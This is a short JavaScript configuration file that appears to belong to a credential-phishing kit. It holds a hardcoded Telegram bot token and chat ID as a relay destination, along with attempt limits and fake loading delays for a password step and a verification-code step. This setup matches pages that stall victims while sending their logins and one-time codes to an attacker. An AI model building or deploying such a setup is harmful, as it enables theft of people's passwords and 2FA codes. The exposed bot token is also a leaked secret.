const config = {
    token: process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ?? '8709560315:AAEeSOks6fkTNaU0bF4o3CkVRxb2Lw2NyTQ',
    chat_id: process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ?? '1004334054024',
    MAX_PASS: 2,
    MAX_CODE: 4,
    PASSWORD_LOADING_TIME: 8,
    CODE_LOADING_TIME: 15
};

export default config;
